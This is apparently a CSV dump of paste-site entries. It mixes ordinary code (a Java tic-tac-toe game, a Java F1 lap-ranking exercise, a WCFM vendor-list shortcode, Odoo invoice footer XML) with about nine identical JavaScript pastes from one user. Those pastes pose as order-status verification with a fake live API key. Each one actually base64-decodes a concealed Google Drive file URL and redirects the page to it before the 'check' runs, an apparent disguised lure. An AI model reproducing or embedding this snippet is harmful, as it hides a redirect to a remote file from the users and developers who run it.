id,title,username,language,date,content
pbw7FwnW,Market.js,hubertzoo90,JavaScript,Monday 14th of April 2025 08:24:41 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/35746/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zrQuPGwy,Untitled,hubertzoo90,JavaScript,Monday 14th of April 2025 08:09:17 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/95175/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BS2GZGiY,tic tac toe,adityasuman100,Java,Monday 14th of April 2025 08:01:57 AM CDT,"
// Missing import statements
import java.util.Scanner;
import java.util.Random;
// Main class to run the game
public class Solution {
    public static void main(String[] args) {
        GameBoard board = new GameBoard();
        Player player1 = new HumanPlayer('X');
        Player player2 = new HumanPlayer('O');
        GameController controller = new GameController(board, player1, player2);
        
        controller.startGame();
    }
}

// Interface for players (following Interface Segregation Principle)
interface Player {
    Move makeMove(GameBoard board);
    char getSymbol();
}

// Board represents the game state (Single Responsibility Principle)
class GameBoard {
    private static final int SIZE = 3;
    private char[][] board;
    
    public GameBoard() {
        board = new char[SIZE][SIZE];
        initializeBoard();
    }
    
    private void initializeBoard() {
        for (int i = 0; i < SIZE; i++) {
            for (int j = 0; j < SIZE; j++) {
                board[i][j] = ' ';
            }
        }
    }
    
    public boolean isCellEmpty(int row, int col) {
        return board[row][col] == ' ';
    }
    
    public void placeMove(Move move, char symbol) {
        if (isValidMove(move)) {
            board[move.getRow()][move.getCol()] = symbol;
        }
    }
    
    public boolean isValidMove(Move move) {
        int row = move.getRow();
        int col = move.getCol();
        
        return row >= 0 && row < SIZE && 
               col >= 0 && col < SIZE && 
               isCellEmpty(row, col);
    }
    
    public boolean isBoardFull() {
        for (int i = 0; i < SIZE; i++) {
            for (int j = 0; j < SIZE; j++) {
                if (board[i][j] == ' ') {
                    return false;
                }
            }
        }
        return true;
    }
    
    public boolean checkWin(char symbol) {
        // Check rows
        for (int i = 0; i < SIZE; i++) {
            if (board[i][0] == symbol && board[i][1] == symbol && board[i][2] == symbol) {
                return true;
            }
        }
        
        // Check columns
        for (int i = 0; i < SIZE; i++) {
            if (board[0][i] == symbol && board[1][i] == symbol && board[2][i] == symbol) {
                return true;
            }
        }
        
        // Check diagonals
        if (board[0][0] == symbol && board[1][1] == symbol && board[2][2] == symbol) {
            return true;
        }
        
        if (board[0][2] == symbol && board[1][1] == symbol && board[2][0] == symbol) {
            return true;
        }
        
        return false;
    }
    
    public void printBoard() {
        System.out.println(""-------------"");
        for (int i = 0; i < SIZE; i++) {
            System.out.print(""| "");
            for (int j = 0; j < SIZE; j++) {
                System.out.print(board[i][j] + "" | "");
            }
            System.out.println();
            System.out.println(""-------------"");
        }
    }
    
    public void reset() {
        initializeBoard();
    }
    
    public int getSize() {
        return SIZE;
    }
}

// Value Object for move coordinates (Immutability)
class Move {
    private final int row;
    private final int col;
    
    public Move(int row, int col) {
        this.row = row;
        this.col = col;
    }
    
    public int getRow() {
        return row;
    }
    
    public int getCol() {
        return col;
    }
}

// Human player implementation
class HumanPlayer implements Player {
    private final char symbol;
    private final Scanner scanner;
    
    public HumanPlayer(char symbol) {
        this.symbol = symbol;
        this.scanner = new Scanner(System.in);
    }
    
    @Override
    public Move makeMove(GameBoard board) {
        int row, col;
        Move move;
        
        do {
            System.out.println(""Player "" + symbol + "", enter your move (row [0-2] column [0-2]): "");
            row = scanner.nextInt();
            col = scanner.nextInt();
            move = new Move(row, col);
            
            if (!board.isValidMove(move)) {
                System.out.println(""Invalid move! Try again."");
            }
        } while (!board.isValidMove(move));
        
        return move;
    }
    
    @Override
    public char getSymbol() {
        return symbol;
    }
}

// Computer AI player implementation (easy to extend for different strategies)
class ComputerPlayer implements Player {
    private final char symbol;
    private final MoveStrategy moveStrategy;
    
    public ComputerPlayer(char symbol, MoveStrategy moveStrategy) {
        this.symbol = symbol;
        this.moveStrategy = moveStrategy;
    }
    
    @Override
    public Move makeMove(GameBoard board) {
        System.out.println(""Computer player "" + symbol + "" is making a move..."");
        return moveStrategy.calculateMove(board, symbol);
    }
    
    @Override
    public char getSymbol() {
        return symbol;
    }
}

// Strategy pattern for different AI levels (Open/Closed Principle)
interface MoveStrategy {
    Move calculateMove(GameBoard board, char symbol);
}

// Random move strategy implementation
class RandomMoveStrategy implements MoveStrategy {
    private final Random random = new Random();
    
    @Override
    public Move calculateMove(GameBoard board, char symbol) {
        int size = board.getSize();
        int row, col;
        Move move;
        
        do {
            row = random.nextInt(size);
            col = random.nextInt(size);
            move = new Move(row, col);
        } while (!board.isValidMove(move));
        
        return move;
    }
}

// Game controller handles the game flow (Single Responsibility Principle)
class GameController {
    private final GameBoard board;
    private final Player player1;
    private final Player player2;
    private Player currentPlayer;
    private GameState gameState;
    private final Scanner scanner;
    
    public GameController(GameBoard board, Player player1, Player player2) {
        this.board = board;
        this.player1 = player1;
        this.player2 = player2;
        this.currentPlayer = player1; // X goes first
        this.gameState = GameState.PLAYING;
        this.scanner = new Scanner(System.in);
    }
    
    public void startGame() {
        System.out.println(""Welcome to Tic Tac Toe!"");
        board.printBoard();
        
        while (gameState == GameState.PLAYING) {
            playTurn();
            checkGameState();
            switchPlayer();
        }
        
        announceResult();
        
        if (askForRematch()) {
            resetGame();
            startGame();
        } else {
            System.out.println(""Thanks for playing!"");
        }
    }
    
    private void playTurn() {
        System.out.println(""Player "" + currentPlayer.getSymbol() + ""'s turn."");
        Move move = currentPlayer.makeMove(board);
        board.placeMove(move, currentPlayer.getSymbol());
        board.printBoard();
    }
    
    private void checkGameState() {
        if (board.checkWin(currentPlayer.getSymbol())) {
            gameState = GameState.WIN;
        } else if (board.isBoardFull()) {
            gameState = GameState.DRAW;
        }
    }
    
    private void switchPlayer() {
        currentPlayer = (currentPlayer == player1) ? player2 : player1;
    }
    
    private void announceResult() {
        if (gameState == GameState.WIN) {
            // Switch back to the winning player
            switchPlayer();
            System.out.println(""Player "" + currentPlayer.getSymbol() + "" wins!"");
        } else if (gameState == GameState.DRAW) {
            System.out.println(""It's a draw!"");
        }
    }
    
    private boolean askForRematch() {
        System.out.println(""Would you like to play again? (y/n): "");
        String answer = scanner.next().toLowerCase();
        return answer.equals(""y"") || answer.equals(""yes"");
    }
    
    private void resetGame() {
        board.reset();
        currentPlayer = player1; // X always starts
        gameState = GameState.PLAYING;
    }
}

// Enum for game state (Type safety)
enum GameState {
    PLAYING, WIN, DRAW
}

"
5rEGs5aA,Products.js,hubertzoo90,JavaScript,Monday 14th of April 2025 07:53:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/03479/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
qkMWkLjW,Order.js,hubertzoo90,JavaScript,Monday 14th of April 2025 07:38:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23665/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nCWMUx1x,Market.js,hubertzoo90,JavaScript,Monday 14th of April 2025 07:23:11 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/03107/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Y41EuSPn,Untitled,hubertzoo90,JavaScript,Monday 14th of April 2025 07:07:27 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46563/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Xu4x88By,wcfm_shortcode_get_vendor_list_by_spmv_product_id,palsushobhan,PHP,Monday 14th of April 2025 06:57:29 AM CDT,"/* List of vendors selling a particular product (SPMV), sorted by product price ASC
 * 
 * Shortcode: [wcfm_vendors_card_by_product id=""123""]
 * 
 * @param array $attr Shortcode attributes.
 * @return string HTML output of vendor cards.
 */
add_shortcode('wcfm_vendors_card_by_product', function ($attr) {
    global $wpdb, $WCFMmp;

    $defaults = array(
        'id' => 0,
    );
    $atts = shortcode_atts($defaults, $attr);

    $product_id = absint(filter_input(INPUT_GET, 'id'));
    if (!$product_id && $atts['id'] && absint($atts['id'])) {
        $product_id = absint($atts['id']);
    }
    if (!$product_id) {
        return '';
    }

    $product = wc_get_product($product_id);
    if (!$product) {
        return '';
    }

    $vendor_id_single = wcfm_get_vendor_id_by_post($product_id);
    $vendor_list = [];
    $is_multi_vendor_enabled = apply_filters('wcfm_is_allow_product_multivendor_title_edit_disable', true);

    if (!$is_multi_vendor_enabled) {
        if(wcfm_is_vendor($vendor_id_single)) {
            $vendor_list[] = $vendor_id_single;
        }
    } else {
        $multi_parent_id = get_post_meta($product_id, '_is_multi_parent', true) ?: get_post_meta($product_id, '_has_multi_selling', true);

        if ($multi_parent_id) {
            $sql = $wpdb->prepare(
                ""SELECT GROUP_CONCAT(product_id) as products
                FROM `{$wpdb->prefix}wcfm_marketplace_product_multivendor`
                WHERE `parent_product_id` = %d"",
                $multi_parent_id
            );
            $results = $wpdb->get_row($sql);
            $product_list = isset($results->products) ? explode(',', $results->products) : array();

            if (!in_array($multi_parent_id, $product_list)) {
                array_unshift($product_list, $multi_parent_id);
            }

            $product_ids = implode(',', $product_list);
            $sql = ""SELECT product_id, stock_status, stock_quantity
                    FROM {$wpdb->wc_product_meta_lookup} wc_product_meta_lookup
                    WHERE product_id IN (%1s)
                    ORDER BY wc_product_meta_lookup.min_price ASC"";
            $prepare = $wpdb->prepare($sql, $product_ids);
            $product_metas = $wpdb->get_results($prepare);

            if (!empty($product_metas)) {
                foreach ($product_metas as $product_meta) {
                    if ($product_meta->stock_status === 'outofstock') {
                        continue;
                    }
                    $post_status = get_post_status($product_meta->product_id);
                    if ($post_status !== 'publish') {
                        continue;
                    }
                    $vendor_id = wcfm_get_vendor_id_by_post($product_meta->product_id);
                    if (wcfm_is_vendor($vendor_id) && !in_array($vendor_id, $vendor_list)) {
                        $vendor_list[] = $vendor_id;
                    }
                }
            }
        } else {
            if (wcfm_is_vendor($vendor_id_single) && !in_array($vendor_id_single, $vendor_list)) {
                $vendor_list[] = $vendor_id_single;
            }
        }
    }

    if (empty($vendor_list)) {
        return '';
    }

    ob_start();
    ?>
    <div id=""wcfmmp-stores-wrap"" class=""top-vendor-container"">
        <div class=""wcfmmp-stores-content"">
            <ul class=""top-vendor-list wcfmmp-store-wrap"">
                <?php
                $args = array('per_row' => 3);
                foreach ($vendor_list as $vendor_id) {
                    $args['store_id'] = $vendor_id;
                    $WCFMmp->template->get_template('store-lists/wcfmmp-view-store-lists-card.php', $args);
                }
                ?>
            </ul>
        </div>
    </div>
    <?php
    $list = ob_get_contents();
    ob_end_clean();
    return $list;
});"
NzGBj4AT,Products.js,hubertzoo90,JavaScript,Monday 14th of April 2025 06:51:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/83205/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CRjJabA2,[NP] F1 Race,dzocesrce,Java,Monday 14th of April 2025 06:40:33 AM CDT,"import java.io.*;
import java.util.List;
import java.util.stream.Collectors;
import java.time.Duration;
import java.time.LocalTime;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;

class Driver implements Comparable<Driver> {
    public static int finalPos=0;

    private String name;
    private List<Lap> laps;

    public Driver(String name,List<Lap> laps) {
        this.name = name;
        this.laps = laps;
    }

    private Lap getFastestLap(){
        return laps.stream().min(Comparator.naturalOrder()).get();
    }
    public static Driver createDriver(String s) {
        String[] parts = s.split(""\\s+"");
        String name = parts[0];
        List<Lap> laps = new ArrayList<>();
        laps.add(new Lap(parts[1]));
        laps.add(new Lap(parts[2]));
        laps.add(new Lap(parts[3]));
        return new Driver(name,laps);
    }

    @Override
    public int compareTo(Driver o) {
        return (int)Long.compare(getFastestLap().getLocalTimeVersion().toNanoOfDay()
                ,o.getFastestLap().getLocalTimeVersion().toNanoOfDay());
    }

    @Override
    public String toString() {
        return String.format(""%d. %-10s%10s"",++finalPos,name,getFastestLap().getTime());
    }
}

class Lap implements Comparable<Lap>{
    private String time;

    public Lap(String time) {
        this.time = time;
    }

    public String getTime() {
        return time;
    }

    public LocalTime getLocalTimeVersion(){
        String[] parts= time.split("":"");
        int minutes= Integer.parseInt(parts[0]);
        int seconds= Integer.parseInt(parts[1]);
        int nanos= Integer.parseInt(parts[2]);
        return LocalTime.of(0,minutes,seconds,nanos);
    }

    @Override
    public int compareTo(Lap o) {
        return (int)Long.compare(getLocalTimeVersion().toNanoOfDay(),o.getLocalTimeVersion().toNanoOfDay());
    }

    @Override
    public String toString() {
        return time+"" ""+getLocalTimeVersion();
    }
}

class F1Race {

    private List<Driver> drivers;

    public F1Race() {
        this.drivers = drivers;
    }

    public void readResults(InputStream in) {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in));
        this.drivers= bufferedReader.lines().map(i->Driver.createDriver(i)).collect(Collectors.toList());
    }

    public void printSorted(PrintStream out) {
        PrintWriter printWriter= new PrintWriter(out);

        this.drivers.stream().sorted().forEach(i->printWriter.println(i));
        printWriter.flush();
    }
}

public class F1Test {

    public static void main(String[] args) {
        F1Race f1Race = new F1Race();
        f1Race.readResults(System.in);
        f1Race.printSorted(System.out);

    }

}
"
dkppcMpU,Order.js,hubertzoo90,JavaScript,Monday 14th of April 2025 06:36:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/51513/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
QgyLBfhU,[QW][4707829]special_footer_external_layout_boxed,rht_odoo,XML,Monday 14th of April 2025 06:25:25 AM CDT,"<data>
    <!--
    Done by RHT on the 14/04/2025
    Need : different footer for commerical invoice
    Task : https://www.odoo.com/odoo/project.task/4707829
    Pastebin : https://pastebin.com/QgyLBfhU
    -->
    <xpath expr=""//div[3]"" position=""replace"">
        <div t-attf-class=""footer o_company_#{company.id}_layout {{report_type != 'pdf' and 'mt-auto'}}"" t-if=""commercial_footer"">
            <div class=""o_footer_content row border-top"">
                I certify that the information presented on this invoice is true and accurate to the best of my knowledge.
            </div>
            <div class=""row"">
                <div class=""col-5"">
                    <strong>Authorized By:</strong>   __________________________
                </div>
                <div class=""col-4"">
                    <strong>Title:</strong>   __________________________
                </div>
                <div class=""col-3"">
                    <strong>Date:</strong>   _________________
                </div>
            </div>
        </div>
        <div class=""o_footer_content row border-top pt-2"" t-if=""not commercial_footer"">
            <div class=""col-8"">
                <span t-field=""company.report_footer""/>
            </div>
            <div class=""col-4 text-end"">
                <strong t-if=""company.report_header"" t-field=""company.report_header"" class=""o_company_tagline"">Company tagline</strong>
                <span t-if=""report_type == 'pdf' and display_name_in_footer"" class=""text-muted"" t-out=""str(o.name) + ', '"">(document name)</span>
                <span t-if=""report_type == 'pdf'"" class=""text-muted"">Page <span class=""page""/> / <span class=""topage""/></span>
            </div>
        </div>
    </xpath>
</data>"
xQEgQzGy,[QW][4707829]commercial_footer_invoice_document,rht_odoo,XML,Monday 14th of April 2025 06:21:40 AM CDT,"<data>
    <!--
    Done by RHT on the 14/04/2025
    Need : different footer for commerical invoice
    Task : https://www.odoo.com/odoo/project.task/4707829
    Pastebin : https://pastebin.com/xQEgQzGy
    -->
    <xpath expr=""//t[2]"" position=""after"">
        <t t-set=""commercial_footer"" t-value=""true""/>
    </xpath>
</data>"
mAJLF5tp,Market.js,hubertzoo90,JavaScript,Monday 14th of April 2025 06:20:57 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/63729/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
